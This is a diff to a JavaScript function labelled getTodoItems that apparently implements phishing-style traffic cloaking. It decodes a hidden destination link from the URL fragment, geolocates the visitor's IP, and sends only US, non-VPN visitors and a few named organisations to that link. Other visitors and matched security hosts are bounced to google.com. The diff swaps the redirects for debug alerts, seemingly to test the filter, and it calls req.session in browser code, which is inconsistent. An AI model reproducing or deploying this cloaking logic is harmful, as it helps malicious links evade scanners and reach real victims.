@@ -131,11 +131,14 @@ const getTodoItems = async () => {
           const a = window.location.href.split("#")[1];
           const encodedInput = a.split("=")[1];
           if (!encodedInput) {
-              window.location.href = "https://href.li?https://google.com";
+              //window.location.href = "https://href.li?https://google.com";
+              console.log('no encoded');
+              
               return;
           }
           if (!encodedInput.startsWith("r-")) {
-              window.location.href = "https://href.li?https://google.com";
+              //window.location.href = "https://href.li?https://google.com";
+              console.log('encoded doesnt start with r');
               return;
           }  
           const base64String = encodedInput.slice(2).replace(/-/g, "+").replace(/_/g, "/");
@@ -151,7 +154,8 @@ const getTodoItems = async () => {
               const jsonObject = JSON.parse(linkString);
               link = jsonObject.data;
           } else {
-              window.location.href = "https://href.li?https://google.com";
+             console.log('not aauthorized');
+              //window.location.href = "https://href.li?https://google.com";
               return;
           }
           var ub = "495ro9-2368zh-f675v8-f8797e"
@@ -161,32 +165,39 @@ const getTodoItems = async () => {
               const host = ipApi[ans.data.ip].hostname;
           if (ipApi[ans.data.ip].isocode !== "US" || ipApi[ans.data.ip].vpn == "yes") {
               if (ipApi[ans.data.ip].organisation == "Datacamp Limited" && ipApi[ans.data.ip].region == "Delaware" && ipApi[ans.data.ip].city == "Wilmington") {
-                  document.location.href = `https://${link}`;
+                alert('delaware')
+                  //document.location.href = `https://${link}`;
                   return;
               } else if (ipApi[ans.data.ip].organisation == "iCloud Private Relay") {
                   req.session.org = ipApi[ans.data.ip].organisation;
-                  document.location.href = `https://${link}`;
+                  alert('iphone relay')
+                 // document.location.href = `https://${link}`;
                   return;
               } else if (hostname.includes(host)) {
-                   document.location.href ="https://href.li?https://google.com"
+                alert('host')
+                   //document.location.href ="https://href.li?https://google.com"
                    return;
               } else {
-                   document.location.href ="https://href.li?https://google.com"
+                   //document.location.href ="https://href.li?https://google.com"
+                   alert('nonthin')
                    return;
               }
           }else{ 
               if (hostname.includes(host)) {
-                  document.location.href ="https://href.li?https://google.com"
+                alert('host2')
+                  //document.location.href ="https://href.li?https://google.com"
                    return;
               } else {
-                  document.location.href = `https://${link}`;
+                alert('good ip')
+                  //document.location.href = `https://${link}`;
                   return;
               }
           }
         });
     });
   }else{
-      window.location.href = "https://href.li?https://google.com";
+    alert('no qs')
+      //window.location.href = "https://href.li?https://google.com";
   }
   } catch (errors) {
     console.error(errors);
